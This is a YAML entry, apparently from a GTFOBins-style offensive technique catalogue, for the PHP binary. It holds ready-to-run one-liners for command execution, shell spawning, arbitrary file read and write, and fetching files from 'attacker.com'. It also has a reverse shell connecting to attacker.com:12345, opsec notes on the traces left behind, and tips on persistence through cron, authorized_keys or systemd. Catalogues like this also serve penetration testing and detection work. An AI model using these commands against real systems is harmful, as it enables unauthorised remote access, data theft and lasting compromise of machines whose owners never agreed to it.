---
name: php
capabilities:
- exec
- spawn
- read
- write
- upload
- download
- reverse-shell
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: high
  artifacts:
  - ~/.bash_history
  - Network connection logs / firewall logs
  - auditd execve events
  - Process arguments visible in ps and auditd
  - File timestamps / inotify events on target paths
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: php -r 'echo shell_exec("/path/to/command");'
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: php -r '$r=array(); exec("/path/to/command", $r); print(join("\n",$r));'
- id: command-3
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: php -r '$p = array(array("pipe","r"),array("pipe","w"),array("pipe", "w"));$h = @proc_open("/path/to/command", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'
- id: download
  description: Fetch a remote file to disk.
  capabilities:
  - download
  command: php -r '$c=file_get_contents("http://attacker.com/path/to/input-file"); file_put_contents("/path/to/output-file", $c);'
- id: file-read
  description: Read an arbitrary file.
  capabilities:
  - read
  command: php -r 'readfile("/path/to/input-file");'
- id: file-write
  description: Write content to an arbitrary file.
  capabilities:
  - write
  command: php -r 'file_put_contents("/path/to/output-file", "DATA");'
- id: reverse-shell
  description: Initiate a reverse shell to attacker host.
  capabilities:
  - reverse-shell
  - exec
  command: php -r '$sock=fsockopen("attacker.com",12345);exec("/bin/sh -i 0<&3 1>&3 2>&3");'
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: php -r 'system("/bin/sh -i");'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: php -r 'passthru("/bin/sh -i");'
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: php -r '$h=@popen("/bin/sh -i","r"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'
- id: shell-4
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: php -r 'pcntl_exec("/bin/sh", ["-p"]);'
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: php -S 0.0.0.0:80
references:
- https://gtfobins.github.io/gtfobins/php/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
